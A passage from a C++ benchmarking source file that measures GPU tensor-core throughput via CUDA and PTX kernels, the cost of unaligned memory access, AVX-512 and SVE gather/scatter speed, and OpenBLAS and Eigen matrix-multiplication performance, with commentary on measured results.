    ->MinTime(10);

extern __global__ void tops_u16u32_sm90dpx_16x16x32_loop128_floyd_warshall_cuda_kernel();
extern __global__ void tops_i16i32_sm90dpx_16x16x32_loop128_needleman_wunsch_cuda_kernel();
extern __global__ void tops_i32i32_sm90dpx_16x16x16_loop128_smith_waterman_cuda_kernel();

BENCHMARK_CAPTURE(                                                                                        //
    theoretic_tops_cuda, u16u32_sm90dpx, tops_u16u32_sm90dpx_16x16x32_loop128_floyd_warshall_cuda_kernel, //
    16, 16, 32, 90, 128, tensor_core_scale_t::single_k)
    ->MinTime(10);
BENCHMARK_CAPTURE(                                                                                          //
    theoretic_tops_cuda, i16i32_sm90dpx, tops_i16i32_sm90dpx_16x16x32_loop128_needleman_wunsch_cuda_kernel, //
    16, 16, 32, 90, 128, tensor_core_scale_t::single_k)
    ->MinTime(10);
BENCHMARK_CAPTURE(                                                                                        //
    theoretic_tops_cuda, i32i32_sm90dpx, tops_i32i32_sm90dpx_16x16x16_loop128_smith_waterman_cuda_kernel, //
    16, 16, 16, 90, 128, tensor_core_scale_t::single_k)
    ->MinTime(10);

#include <filesystem> // `std::filesystem::absolute` to locate PTX IR file

/**
 *  @brief Runs the benchmark loop for precompiled CUDA C++ kernels using
 *  the low-level @b driver API. It counts TOPS (Tensor Operations Per
 *  Second) as the number of scalar multiplications in $A * B$, ignoring
 *  the $D$ additive part of $A * B + D$.
 *
 *  @param m,n,k Dimensions of matrices multiplied by one instruction.
 *  @param required_capability GPU's Streaming Multiprocessor generation needed.
 *
 *  @param file_name The name of the @b `.ptx` file in current directory.
 *  @param kernel_name The name of a specific @b `.visible` entry function.
 *  @param scale Number of threads in each block, computing MMA collectively.
 */
static void theoretic_tops_ptx(                  //
    bm::State &state,                            //
    std::string file_name,                       //
    std::string kernel_name,                     //
    std::size_t m, std::size_t n, std::size_t k, //
    int required_capability,                     //
    std::size_t repetitions,                     //
    tensor_core_scale_t scale = tensor_core_scale_t::unknown_k) {

    // Resolve the absolute path to the PTX file
    std::string ptx_file = file_name;
    std::filesystem::path ptx_path = std::filesystem::absolute(ptx_file);
    if (!std::filesystem::exists(ptx_path)) {
        state.SkipWithError("Failed to find PTX file.");
        return;
    }
    ptx_file = ptx_path.string();

    CUdevice device = 0;
    CUcontext context = nullptr;
    CUmodule module_ = nullptr;
    CUfunction kernel = nullptr;
    CUresult result = CUDA_SUCCESS;
    auto last_error_string = [&result]() -> std::string {
        char const *error_string = nullptr;
        cuGetErrorString(result, &error_string);
        return error_string;
    };

    // Initialize CUDA
    result = cuInit(0);
    if (result != CUDA_SUCCESS) {
        state.SkipWithError("Failed to initialize CUDA: " + last_error_string());
        return;
    }

    // Get the first device
    result = cuDeviceGet(&device, 0);
    if (result != CUDA_SUCCESS) {
        state.SkipWithError("Failed to get CUDA device: " + last_error_string());
        return;
    }

    // Reset its error!
    cuDevicePrimaryCtxReset(device);

    // Get compute capability
    int capability_major = 0, capability_minor = 0;
    result = cuDeviceGetAttribute(&capability_major, CU_DEVICE_ATTRIBUTE_COMPUTE_CAPABILITY_MAJOR, device);
    result = cuDeviceGetAttribute(&capability_minor, CU_DEVICE_ATTRIBUTE_COMPUTE_CAPABILITY_MINOR, device);
    if (result != CUDA_SUCCESS) {
        state.SkipWithError("Failed to query compute capability: " + last_error_string());
        return;
    }

    int const capability = capability_major * 10 + capability_minor;
    if (capability < required_capability) {
        std::string error_msg =
            "Insufficient compute capability. Required: " + std::to_string(required_capability / 10) + "." +
            std::to_string(required_capability % 10) + ", Detected: " + std::to_string(capability_major) + "." +
            std::to_string(capability_minor);
        state.SkipWithError(error_msg.c_str());
        return;
    }

    // Create context
    int context_flags = 0; // CU_CTX_SCHED_SPIN | CU_CTX_LMEM_RESIZE_TO_MAX | CU_CTX_SYNC_MEMOPS;
    result = cuCtxCreate(&context, context_flags, device);
    if (result != CUDA_SUCCESS) {
        state.SkipWithError("Failed to create CUDA context: " + last_error_string());
        return;
    }

    // Load the PTX file and JIT it!
    // If the compilation is taking long, consider using the `CUDA_CACHE_PATH`
    // environment variable to cache already compiled modules:
    // https://developer.nvidia.com/blog/cuda-pro-tip-understand-fat-binaries-jit-caching/
    result = cuModuleLoad(&module_, ptx_file.c_str());
    if (result != CUDA_SUCCESS) {
        state.SkipWithError("Failed to load PTX file: " + last_error_string());
        cuCtxDestroy(context);
        return;
    }

    // Access the kernel function
    result = cuModuleGetFunction(&kernel, module_, kernel_name.c_str());
    if (result != CUDA_SUCCESS) {
        state.SkipWithError("Failed to get kernel function from PTX file: " + last_error_string());
        cuModuleUnload(module_);
        cuCtxDestroy(context);
        return;
    }

    // Query device properties
    int num_sms = 0;
    int warp_size = 0;
    result = cuDeviceGetAttribute(&num_sms, CU_DEVICE_ATTRIBUTE_MULTIPROCESSOR_COUNT, device);
    result = cuDeviceGetAttribute(&warp_size, CU_DEVICE_ATTRIBUTE_WARP_SIZE, device);
    if (result != CUDA_SUCCESS) {
        state.SkipWithError("Failed to query device properties: " + last_error_string());
        cuCtxDestroy(context);
        return;
    }

    // Set kernel launch configuration, same way as in `theoretic_tops_cuda`.
    dim3 grid_dim(num_sms);
    dim3 block_dim(warp_size * 4);
    void *kernel_args[] = {nullptr};

    // We need shared memory for matrix multiplications on Hopper:
    // - on V100 we have 96 KB per SM
    // - on H100 we have 228 KB per SM
    unsigned int shared_memory = 0; // 32 * 1024;
    if (scale == tensor_core_scale_t::unknown_k) scale = tensor_core_scale(required_capability);

    for (auto _ : state) {
        result = cuLaunchKernel(                   //
            kernel,                                //
            grid_dim.x, grid_dim.y, grid_dim.z,    //
            block_dim.x, block_dim.y, block_dim.z, //
            shared_memory, nullptr, kernel_args, nullptr);
        if (result != CUDA_SUCCESS) {
            state.SkipWithError("Failed to launch the kernel: " + last_error_string());
            break;
        }
        result = cuCtxSynchronize();
        if (result != CUDA_SUCCESS) {
            state.SkipWithError("Failed while running the kernel: " + last_error_string());
            break;
        }
    }

    std::size_t const threads = static_cast<std::size_t>(grid_dim.x * block_dim.x);
    std::size_t const tops_per_cycle = m * n * k * 2 * repetitions;
    std::size_t const tops_per_gpu = tops_per_cycle * threads / static_cast<std::size_t>(scale);
    state.counters["TOP"] = benchmark::Counter(tops_per_gpu * state.iterations(), benchmark::Counter::kIsRate);

    // Clean up
    cuModuleUnload(module_);
    cuCtxDestroy(context);
}

BENCHMARK_CAPTURE(                                                        //
    theoretic_tops_ptx, f16f16_sm70mma,                                   //
    "less_slow_sm70.ptx", "tops_f16f16_sm70mma_8x8x4_loop128_ptx_kernel", //
    16, 16, 16, 70, 128, tensor_core_scale_t::quadpair_k)
    ->MinTime(10);

BENCHMARK_CAPTURE(                                                        //
    theoretic_tops_ptx, f16f32_sm70mma,                                   //
    "less_slow_sm70.ptx", "tops_f16f32_sm70mma_8x8x4_loop128_ptx_kernel", //
    16, 16, 16, 70, 128, tensor_core_scale_t::quadpair_k)
    ->MinTime(10);

BENCHMARK_CAPTURE(                                                            //
    theoretic_tops_ptx, f16f16_sm80wmma,                                      //
    "less_slow_sm80.ptx", "tops_f16f16_sm80wmma_16x16x16_loop128_ptx_kernel", //
    16, 16, 16, 80, 128, tensor_core_scale_t::warp_k)
    ->MinTime(10);

BENCHMARK_CAPTURE(                                                            //
    theoretic_tops_ptx, f16f32_sm80wmma,                                      //
    "less_slow_sm80.ptx", "tops_f16f32_sm80wmma_16x16x16_loop128_ptx_kernel", //
    16, 16, 16, 80, 128, tensor_core_scale_t::warp_k)
    ->MinTime(10);

BENCHMARK_CAPTURE(                                                        //
    theoretic_tops_ptx, f64f64_sm80mma,                                   //
    "less_slow_sm80.ptx", "tops_f64f64_sm80mma_8x8x4_loop128_ptx_kernel", //
    8, 8, 4, 80, 128, tensor_core_scale_t::quadpair_k)
    ->MinTime(10);

BENCHMARK_CAPTURE(                                                            //
    theoretic_tops_ptx, tf32f32_sm80wmma,                                     //
    "less_slow_sm80.ptx", "tops_tf32f32_sm80wmma_16x16x8_loop128_ptx_kernel", //
    16, 16, 8, 80, 128, tensor_core_scale_t::warp_k)
    ->MinTime(10);

BENCHMARK_CAPTURE(                                                             //
    theoretic_tops_ptx, f16f32_sm90wgmma,                                      //
    "less_slow_sm90a.ptx", "tops_f16f32_sm90tc_m64n256k16_loop128_ptx_kernel", //
    64, 256, 16, 90, 128, tensor_core_scale_t::warpgroup_k)
    ->MinTime(10);

BENCHMARK_CAPTURE(                                                              //
    theoretic_tops_ptx, bf16f32_sm90wgmma,                                      //
    "less_slow_sm90a.ptx", "tops_bf16f32_sm90tc_m64n256k16_loop128_ptx_kernel", //
    64, 256, 16, 90, 128, tensor_core_scale_t::warpgroup_k)
    ->MinTime(10);

BENCHMARK_CAPTURE(                                                             //
    theoretic_tops_ptx, tf32f32_sm90wgmma,                                     //
    "less_slow_sm90a.ptx", "tops_tf32f32_sm90tc_m64n256k8_loop128_ptx_kernel", //
    64, 256, 8, 90, 128, tensor_core_scale_t::warpgroup_k)
    ->MinTime(10);

BENCHMARK_CAPTURE(                                                                //
    theoretic_tops_ptx, b1i32and_sm90wgmma,                                       //
    "less_slow_sm90a.ptx", "tops_b1i32and_sm90tc_m64n256k256_loop128_ptx_kernel", //
    64, 256, 256, 90, 128, tensor_core_scale_t::warpgroup_k)
    ->MinTime(10);

/**
 *  The results on H200 are quite interesting.
 *
 *  - The identical SM 70 and SM 90 will compile to the same SASS and will have
 *    the same throughput of around 150 TOPs, or only around @b 15% of the
 *    number recommended in the datasheet. Similar for double-precision.
 *
 *  - The highest-precision "properly accelerated" type - TF32, will yield only
 *    @b 25 TOPs when using the old Warp-level primitives, but will skyrocket
 *    to @b 600 TOPS when using the Warp-Group-level MMA.
 */

#endif

#pragma endregion // GPGPU Programming

#pragma endregion // - Numerics

#pragma region - Memory

#pragma region Alignment of Memory Accesses

/**
 *  @b Force-inline is the first macro that many High-Performance Computing
 *  libraries define. It will bloat the binary, but will reduce the number
 *  of function calls and stack frames, which can be crucial for small kernels.
 *  The name of the attribute, however, differs between compilers!
 */
#if defined(_MSC_VER)
#define LESS_SLOW_ALWAYS_INLINE [[msvc::forceinline]] inline // `__forceinline`
#elif defined(__GNUC__)
#define LESS_SLOW_ALWAYS_INLINE [[gnu::always_inline]] inline
#elif defined(__clang__)
#define LESS_SLOW_ALWAYS_INLINE [[clang::always_inline]] inline
#else
#define LESS_SLOW_ALWAYS_INLINE inline __attribute__((always_inline))
#endif

/**
 *  @brief  Checks if a number is a power of two.
 *
 *  An unsigned integer is a power of two if and only if it has exactly one
 *  bit set. This can be checked by using the bitwise AND operator with the
 *  number and its predecessor: `x & (x - 1)` will be zero only for powers
 *  of two.
 *
 *  The same thing can be achieved with the `std::popcount` function, which
 *  is available in C++20 or compiler intrinsics like `__builtin_popcountll`
 *  on GCC. Most modern compilers will optimize this to a single instruction.
 *
 *  @see "Bit Twiddling Hacks" by Sean Eron Anderson:
 *       https://graphics.stanford.edu/~seander/bithacks
 *  @see Book "Hacker's Delight" by Henry S. Warren Jr.:
 *       https://en.wikipedia.org/wiki/Hacker%27s_Delight
 */
LESS_SLOW_ALWAYS_INLINE bool is_power_of_two(std::uint64_t x) noexcept { return x && !(x & (x - 1)); }

/**
 *  When designing high-performance kernels, memory alignment is crucial.
 *  Misaligned memory accesses split data across cache lines, causing extra
 *  loads and reducing efficiency. While split loads are unavoidable for large
 *  data structures, smaller kernels can benefit significantly from careful
 *  memory management.
 *
 *  Modern CPUs typically have 64-byte cache lines, though Apple's M-series
 *  uses 128 bytes. This means assuming @b `alignas(64)` won't ensure compatibility.
 *  Instead, cache properties must be inferred at runtime for optimal performance.
 *
 *  In this benchmark, we demonstrate how `std::sort` behaves when processing
 *  cache-line-sized objects that are either correctly aligned or intentionally
 *  misaligned. This covers:
 *
 *  - Using a custom strided iterator (`strided_ptr`) to simulate offset memory access.
 *  - Generating semi-random integers using Knuth's multiplicative hash.
 *  - Reading cache properties with platform-specific APIs.
 *  - Flushing the CPU cache between runs to ensure consistent results.
 */

#include <cassert>  // `assert`
#include <memory>   // `std::assume_aligned`, `std::unique_ptr`
#include <string>   // `std::string`, `std::stoull`
#include <iterator> // `std::random_access_iterator_tag`
#include <fstream>  // `std::ifstream`

/**
 *  @brief  Reads the contents of a file from the specified path into a string.
 */
std::string read_file_contents(std::string const &path) {
    std::ifstream file(path);
    std::string content;
    if (!file.is_open()) return "";
    std::getline(file, content);
    file.close();
    return content;
}

/**
 *  @brief  Fetches the cache line size using OS-specific APIs.
 *          Supports Linux, macOS, and Windows.
 *
 *  It's easier to use the @b `std::hardware_destructive_interference_size`
 *  in C++ 17 and newer, if the `__cpp_lib_hardware_interference_size` feature
 *  macro is defined. But this will be incorrect, if the compilation platform
 *  is different from the runtime platform.
 *
 *  A more advanced approach would be to use hardware-specific instructions,
 *  like the @b `cpuid` on x86, and infer the cache line size from the returned
 *  bitmasks. That's however, not only different on Arm, but also differs
 *  between Intel and AMD!
 */
std::size_t fetch_cache_line_width() {

#if defined(__linux__)
    // On Linux, we can read the cache line size and the L2 cache size from the
    // "sysfs" virtual filesystem. It can provide the properties of each individual
    // CPU core.
    std::string file_contents = read_file_contents("/sys/devices/system/cpu/cpu0/cache/index0/coherency_line_size");
    std::size_t cache_line_size = std::stoull(file_contents);
    return cache_line_size;

#elif defined(__APPLE__)
    // On macOS, we can use the `sysctlbyname` function to read the
    // `hw.cachelinesize` and `hw.l2cachesize` values into unsigned integers.
    // You can achieve the same by using the `sysctl -a` command-line utility.
    size_t size;
    size_t len = sizeof(size);
    if (sysctlbyname("hw.cachelinesize", &size, &len, nullptr, 0) == 0) return size;

#elif defined(_WIN32)
    SYSTEM_LOGICAL_PROCESSOR_INFORMATION buffer[256];
    DWORD len = sizeof(buffer);
    if (GetLogicalProcessorInformation(buffer, &len))
        for (size_t i = 0; i < len / sizeof(SYSTEM_LOGICAL_PROCESSOR_INFORMATION); ++i)
            if (buffer[i].Relationship == RelationCache && buffer[i].Cache.Level == 1) return buffer[i].Cache.LineSize;
#endif

    return 0;
}

/**
 *  @brief  A minimalistic pointer with non-unit stride/step.
 */
template <typename value_type_>
class strided_ptr {
    std::byte *data_;
    std::size_t stride_;

  public:
    using value_type = value_type_;
    using pointer = value_type_ *;
    using reference = value_type_ &;
    using difference_type = std::ptrdiff_t;
    using iterator_category = std::random_access_iterator_tag;

    strided_ptr(std::byte *data, std::size_t stride_bytes) : data_(data), stride_(stride_bytes) {
        assert(data_ && "Pointer must not be null, as NULL arithmetic is undefined");
    }
#if defined(__cpp_lib_assume_aligned) // Not available in Apple Clang
    reference operator*() const noexcept {
        return *std::launder(std::assume_aligned<1>(reinterpret_cast<pointer>(data_)));
    }
    reference operator[](difference_type i) const noexcept {
        return *std::launder(std::assume_aligned<1>(reinterpret_cast<pointer>(data_ + i * stride_)));
    }
#else
    reference operator*() const noexcept { return *reinterpret_cast<pointer>(data_); }
    reference operator[](difference_type i) const noexcept { return *reinterpret_cast<pointer>(data_ + i * stride_); }
#endif // defined(__cpp_lib_assume_aligned)

    // clang-format off
    pointer operator->() const noexcept { return &operator*(); }
    strided_ptr &operator++() noexcept { data_ += stride_; return *this; }
    strided_ptr operator++(int) noexcept { strided_ptr temp = *this; ++(*this); return temp; }
    strided_ptr &operator--() noexcept { data_ -= stride_; return *this; }
    strided_ptr operator--(int) noexcept { strided_ptr temp = *this; --(*this); return temp; }
    strided_ptr &operator+=(difference_type offset) noexcept { data_ += offset * stride_; return *this; }
    strided_ptr &operator-=(difference_type offset) noexcept { data_ -= offset * stride_; return *this; }
    strided_ptr operator+(difference_type offset) noexcept { strided_ptr temp = *this; return temp += offset; }
    strided_ptr operator-(difference_type offset) noexcept { strided_ptr temp = *this; return temp -= offset; }
    friend difference_type operator-(strided_ptr const &a, strided_ptr const &b) noexcept { assert(a.stride_ == b.stride_); return (a.data_ - b.data_) / static_cast<difference_type>(a.stride_); }
    friend bool operator==(strided_ptr const &a, strided_ptr const &b) noexcept { return a.data_ == b.data_; }
    friend bool operator<(strided_ptr const &a, strided_ptr const &b) noexcept { return a.data_ < b.data_; }
    friend bool operator!=(strided_ptr const &a, strided_ptr const &b) noexcept { return !(a == b); }
    friend bool operator>(strided_ptr const &a, strided_ptr const &b) noexcept { return b < a; }
    friend bool operator<=(strided_ptr const &a, strided_ptr const &b) noexcept { return !(b < a); }
    friend bool operator>=(strided_ptr const &a, strided_ptr const &b) noexcept { return !(a < b); }
    // clang-format on
};

#if defined(__aarch64__)
/**
 *  @brief  Helper derived from `__aarch64_sync_cache_range` in `libgcc`, used to
 *          @b flush the cache on Arm64, where the x86 `_mm_clflush` intrinsic is not available.
 *  @param  address The address to flush from the cache, must be aligned to the cache line size.
 */
void _mm_clflush(void const *address) { asm volatile("dc\tcvau, %0" : : "r"(address) : "memory"); }
#endif

enum class alignment_mode_t { unaligned_k, aligned_k };

template <alignment_mode_t alignment_>
static void memory_access(bm::State &state) {
    constexpr std::size_t typical_l2_size = 1024u * 1024u;
    std::size_t const cache_line_width = fetch_cache_line_width();
    assert( //
        cache_line_width > 0 && is_power_of_two(cache_line_width) &&
        "The cache line width must be a power of two greater than 0");

    // We are using a fairly small L2-cache-sized buffer to show, that this is
    // not just about Big Data. Anything beyond a few megabytes with irregular
    // memory accesses may suffer from the same issues. For split-loads, pad our
    // buffer with an extra `cache_line_width` bytes of space.
    std::size_t const buffer_size = typical_l2_size + cache_line_width;
    aligned_array<std::byte> buffer(buffer_size, cache_line_width);
    std::byte *const buffer_ptr = buffer.begin();

    // Let's initialize a strided range using out `strided_ptr` template, but
    // for `alignment_mode_t::unaligned_k` make sure that the scalar-of-interest in each
    // stride is located exactly at the boundary between two cache lines.
    std::size_t const offset_within_page =
        alignment_ == alignment_mode_t::unaligned_k ? (cache_line_width - sizeof(std::uint32_t) / 2) : 0;
    strided_ptr<std::uint32_t> integers(buffer_ptr + offset_within_page, cache_line_width);

    // We will start with a random seed position and walk through the buffer.
    std::uint32_t semi_random_state = 0xFFFFFFFFu;
    std::size_t const count_pages = typical_l2_size / cache_line_width;
    for (auto _ : state) {
        // Generate some semi-random data, using Knuth's multiplicative hash
        // number derived from the golden ratio.
        std::generate_n(integers, count_pages, [&semi_random_state] { return semi_random_state *= 2654435761u; });

        // Flush all of the pages out of the cache.
        // The `__builtin___clear_cache(buffer_ptr, buffer_ptr + buffer.size())`
        // compiler intrinsic can't be used for the data cache, only the
        // instructions cache. For Arm, GCC provides a `__aarch64_sync_cache_range`
        // intrinsic, but it's not available in Clang.
        for (std::size_t i = 0; i != count_pages; ++i) _mm_clflush(&integers[i]);
        bm::ClobberMemory();

        std::sort(integers, integers + count_pages);
    }
}

static void memory_access_unaligned(bm::State &state) { memory_access<alignment_mode_t::unaligned_k>(state); }
static void memory_access_aligned(bm::State &state) { memory_access<alignment_mode_t::aligned_k>(state); }

BENCHMARK(memory_access_unaligned)->MinTime(10);
BENCHMARK(memory_access_aligned)->MinTime(10);

/**
 *  One variant executes in 5.8 miliseconds, and the other in 5.2 miliseconds,
 *  consistently resulting a @b 10% performance difference.
 */

#pragma endregion // Alignment of Memory Accesses

#pragma region Gather & Scatter Operations for Spread Data

/**
 *  Sometimes, the variables of interest are scattered across memory, and we
 *  need to gather them into a contiguous buffer for processing. This is already
 *  common in sparse matrix operations, where only a few elements are non-zero,
 *  but can apply to any irregular data structure...
 *
 *  The only question is: is there some smart way to gather these elements?
 *
 *  Our benchmarks is following - generate 32-bit unsigned integers from 0 to N,
 *  random-shuffle and use them as gathering indices. For scatter operations,
 *  we will use the same indicies to overwrite information in a separate buffer.
 *
 *  We will be looking at the ideal simplest case when the offset type and the
 *  data have identical size.
 */
using spread_index_t = std::uint32_t;
using spread_data_t = float;

/**
 * @brief Perform a scalar gather operation.
 * @param data The data buffer to gather from.
 * @param indices The indices used to gather data.
 * @param result The buffer where gathered data will be stored.
 * @param size The number of elements to process.
 */
void spread_gather_scalar( //
    spread_data_t const *data, spread_index_t const *indices, spread_data_t *result, std::size_t size) noexcept {
    for (std::size_t i = 0; i < size; ++i) result[i] = data[indices[i]];
}

/**
 * @brief Perform a scalar scatter operation.
 * @param data The buffer to scatter data into.
 * @param indices The indices used to scatter data.
 * @param source The buffer containing data to scatter.
 * @param size The number of elements to process.
 */
void spread_scatter_scalar( //
    spread_data_t *data, spread_index_t const *indices, spread_data_t const *source, std::size_t size) noexcept {
    for (std::size_t i = 0; i < size; ++i) data[indices[i]] = source[i];
}

template <typename kernel_type_>
static void spread_memory(bm::State &state, kernel_type_ kernel, std::size_t align = sizeof(spread_data_t)) {
    std::size_t const size = static_cast<std::size_t>(state.range(0));
    aligned_array<spread_index_t> indices(size, align);
    aligned_array<spread_data_t> first(size, align);
    aligned_array<spread_data_t> second(size, align);

    std::iota(indices.begin(), indices.begin() + size, 0);
    std::random_device random_device;
    std::mt19937 generator(random_device());
    std::shuffle(indices.begin(), indices.begin() + size, generator);

    for (auto _ : state) kernel(first.begin(), indices.begin(), second.begin(), size);
}

BENCHMARK_CAPTURE(spread_memory, gather_scalar, spread_gather_scalar)
    ->Range(1 << 10, 1 << 20)
    ->MinTime(5)
    ->MinWarmUpTime(1);
BENCHMARK_CAPTURE(spread_memory, scatter_scalar, spread_scatter_scalar)
    ->Range(1 << 10, 1 << 20)
    ->MinTime(5)
    ->MinWarmUpTime(1);

#if defined(__AVX512F__)
void spread_gather_avx512( //
    spread_data_t const *data, spread_index_t const *indices, spread_data_t *result, std::size_t size) {
    constexpr std::size_t simd_width_k = sizeof(__m512i) / sizeof(spread_data_t);
    static_assert( //
        sizeof(spread_data_t) == sizeof(spread_index_t), "Data and index types must have the same size");
    std::size_t i = 0;
    for (; i + simd_width_k <= size; i += simd_width_k)
        _mm512_storeu_si512(&result[i], _mm512_i32gather_epi32(_mm512_loadu_si512(&indices[i]), data, 4));
    for (; i < size; ++i) result[i] = data[indices[i]];
}

void spread_scatter_avx512( //
    spread_data_t *data, spread_index_t const *indices, spread_data_t const *source, std::size_t size) {
    constexpr std::size_t simd_width_k = sizeof(__m512i) / sizeof(spread_data_t);
    static_assert( //
        sizeof(spread_data_t) == sizeof(spread_index_t), "Data and index types must have the same size");
    std::size_t i = 0;
    for (; i + simd_width_k <= size; i += simd_width_k)
        _mm512_i32scatter_epi32(data, _mm512_loadu_si512(&indices[i]), _mm512_loadu_si512(&source[i]), 4);
    for (; i < size; ++i) data[indices[i]] = source[i];
}

BENCHMARK_CAPTURE(spread_memory, gather_avx512, spread_gather_avx512, 64)
    ->Range(1 << 10, 1 << 20)
    ->MinTime(5)
    ->MinWarmUpTime(1);
BENCHMARK_CAPTURE(spread_memory, scatter_avx512, spread_scatter_avx512, 64)
    ->Range(1 << 10, 1 << 20)
    ->MinTime(5)
    ->MinWarmUpTime(1);

/**
 *  For consistent timing, for AVX-512 we align allocations to the ZMM register
 *  size, which also coincides with the cache line width on x86 CPUs: @b 64!
 *
 *  For short arrays under 4K elements, gathers can get up to 50% faster,
 *  dropping from @b 270ns to @b 136ns. On larger sizes gather can @b lose
 *  to serial code. Like on arrays of 65K entries it can be 50% slower!
 *  Scatters are even more questionable!
 */
#endif

#if defined(__ARM_FEATURE_SVE) // Arm NEON has no gather/scatter instructions, but SVE does 🥳

/**
 *  Arm Scalable Vector Extension @b (SVE) is one of the weirdest current SIMD
 *  extensions. Unlike AVX2, AVX-512, or even RVV on RISC-V, it doesn't preset
 *  the register width at the ISA level! It's up to the physical implementation
 *  to choose any power of two between 128 and @b 2048 bits.
 *
 *  In practice, Fugaku supercomputer likely has the largest SVE implementation
 *  at 512-bits length. The Arm Neoverse N2 core has 256-bit SVE. It also
 *  handles masking differently from AVX-512! Definitely worth reading about!
 *
 *  @see "ARM's Scalable Vector Extensions: A Critical Look at SVE2 For Integer
 *       Workloads" by @ zingaburga:
 *       https://gist.github.com/zingaburga/805669eb891c820bd220418ee3f0d6bd
 *
 */
#include <arm_sve.h>

constexpr std::size_t max_sve_size_k = 2048 / CHAR_BIT;

void spread_gather_sve( //
    spread_data_t const *data, spread_index_t const *indices, spread_data_t *result, std::size_t size) {
    for (std::size_t i = 0; i < size; i += svcntw()) {
        svbool_t pg = svwhilelt_b32(i, size);
        svuint32_t sv_indices = svld1(pg, &indices[i]);
        svfloat32_t sv_data = svld1_gather_offset(pg, data, sv_indices);
        svst1(pg, &result[i], sv_data);
    }
}

void spread_scatter_sve( //
    spread_data_t *data, spread_index_t const *indices, spread_data_t const *source, std::size_t size) {
    for (std::size_t i = 0; i < size; i += svcntw()) {
        svbool_t pg = svwhilelt_b32(i, size);
        svuint32_t sv_indices = svld1(pg, &indices[i]);
        svfloat32_t sv_data = svld1(pg, &source[i]);
        svst1_scatter_offset(pg, data, sv_indices, sv_data);
    }
}

BENCHMARK_CAPTURE(spread_memory, gather_sve, spread_gather_sve, max_sve_size_k)
    ->Range(1 << 10, 1 << 20)
    ->MinTime(5)
    ->MinWarmUpTime(1);
BENCHMARK_CAPTURE(spread_memory, scatter_sve, spread_scatter_sve, max_sve_size_k)
    ->Range(1 << 10, 1 << 20)
    ->MinTime(5)
    ->MinWarmUpTime(1);

/**
 *  @b Finally! This may just be the first place where SVE supersedes NEON
 *  in functionality and may have a bigger improvement over scalar code than
 *  AVX-512 on a similar-level x86 platform!
 *
 *  If you are very lucky with your input sizes, on small arrays under 65K
 *  on AWS Graviton, gathers can be up to 4x faster compared to serial code!
 *  On larger sizes, they again start losing to serial code. This makes
 *  their applicability very limited 😡
 *
 *  Vectorized scatters are universally slower than serial code on Graviton
 *  for small inputs, but on larger ones over 1MB start winning up to 50%!
 *  Great way to get everyone confused 🤬
 */
#endif

#pragma endregion // Gather & Scatter Operations for Spread Data

#pragma region Non Uniform Memory Access

/**
 *  Takes a string like "64K" and "128M" and returns the corresponding size in
 *  bytes, expanding the multiple prefixes to the actual size, like "65536" and
 *  "134217728", respectively.
 */
std::size_t parse_size_string(std::string const &str) {
    std::size_t value = std::stoull(str);
    if (str.find("K") != std::string::npos || str.find("k") != std::string::npos) { value *= 1024; }
    else if (str.find("M") != std::string::npos || str.find("m") != std::string::npos) { value *= 1024 * 1024; }
    else if (str.find("G") != std::string::npos || str.find("g") != std::string::npos) { value *= 1024 * 1024 * 1024; }
    return value;
}

#pragma endregion // Non Uniform Memory Access

#pragma region Memory Bound Linear Algebra
#include <cblas.h>
/**
 *  ! OpenBLAS defines a `SIZE` macro for internal use, which conflicts with `fmt`
 *  ! and other code trying to use that name for variable names, so we must undefine it.
 */
#undef SIZE

template <typename scalar_type_>
static void cblas_tops(bm::State &state) {
    // ! Not all versions of OpenBLAS define the `openblas_set_num_threads`
    // ! symbol, so we use CMake's `CheckFunctionExists` for that.
#if defined(LESS_SLOW_HAS_OPENBLAS_SET_NUM_THREADS)
    openblas_set_num_threads(physical_cores());
#endif

    // BLAS expects leading dimensions: `lda` = `ldb` = `ldc` = `n` for square inputs.
    std::size_t n = static_cast<std::size_t>(state.range(0));
    int const lda = static_cast<int>(n), ldb = static_cast<int>(n), ldc = static_cast<int>(n);

    // Allocate and initialize data
    aligned_array<scalar_type_> a(n * n), b(n * n), c(n * n);
    std::iota(a.begin(), a.end(), 0);
    std::iota(b.begin(), b.end(), 0);

    // BLAS defines GEMM routines as: alpha * a * b + beta * c
    for (auto _ : state)
        if constexpr (std::is_same_v<scalar_type_, float>)
            cblas_sgemm(CblasRowMajor, CblasNoTrans, CblasNoTrans, n, n, n, //
                        /* alpha: */ 1, a.begin(), lda, b.begin(), ldb,     //
                        /* beta: */ 0, c.begin(), ldc);
        else
            cblas_dgemm(CblasRowMajor, CblasNoTrans, CblasNoTrans, n, n, n, //
                        /* alpha: */ 1, a.begin(), lda, b.begin(), ldb,     //
                        /* beta: */ 0, c.begin(), ldc);

    std::size_t tops_per_cycle = n * n * (n /* multiplications */ + (n - 1) /* additions */);
    state.counters["TOP"] = bm::Counter(state.iterations() * tops_per_cycle, bm::Counter::kIsRate);
    state.SetComplexityN(n);
}

BENCHMARK(cblas_tops<float>)->RangeMultiplier(2)->Range(8, 16384)->Complexity(benchmark::oNCubed);
BENCHMARK(cblas_tops<double>)->RangeMultiplier(2)->Range(8, 16384)->Complexity(benchmark::oNCubed);

/**
 *  Eigen is a high-level C++ library for linear algebra that provides a
 *  convenient templated API for matrix operations.
 *
 *  @see Supported Preprocessor Directives:
 *       https://eigen.tuxfamily.org/dox/TopicPreprocessorDirectives.html
 */
#define EIGEN_FAST_MATH 1             // Affects mostly trigonometry, less relevant for GEMM
#define EIGEN_NO_IO 1                 // Faster compilation
#define EIGEN_NO_AUTOMATIC_RESIZING 1 // Cleaner logic
#include <Eigen/Dense>

template <typename scalar_type_>
static void eigen_tops(bm::State &state) {
    Eigen::setNbThreads(physical_cores());

    // Matrix dimension
    std::size_t n = static_cast<std::size_t>(state.range(0));

    // Allocate Eigen matrices
    Eigen::Matrix<scalar_type_, Eigen::Dynamic, Eigen::Dynamic> a(n, n);
    Eigen::Matrix<scalar_type_, Eigen::Dynamic, Eigen::Dynamic> b(n, n);
    Eigen::Matrix<scalar_type_, Eigen::Dynamic, Eigen::Dynamic> c(n, n);
    std::iota(a.data(), a.data() + (n * n), scalar_type_(0));
    std::iota(b.data(), b.data() + (n * n), scalar_type_(0));

    for (auto _ : state) {
        c.noalias() = a * b;         // `noalias()` avoids temporary accumulation overhead
        bm::DoNotOptimize(c.data()); // prevent compiler from optimizing out
    }

    std::size_t tops_per_cycle = n * n * (n /* multiplications */ + (n - 1) /* additions */);
    state.counters["TOP"] = bm::Counter(state.iterations() * tops_per_cycle, bm::Counter::kIsRate);
    state.SetComplexityN(n);
}

BENCHMARK(eigen_tops<double>)->RangeMultiplier(2)->Range(8, 16384)->Complexity(benchmark::oNCubed);
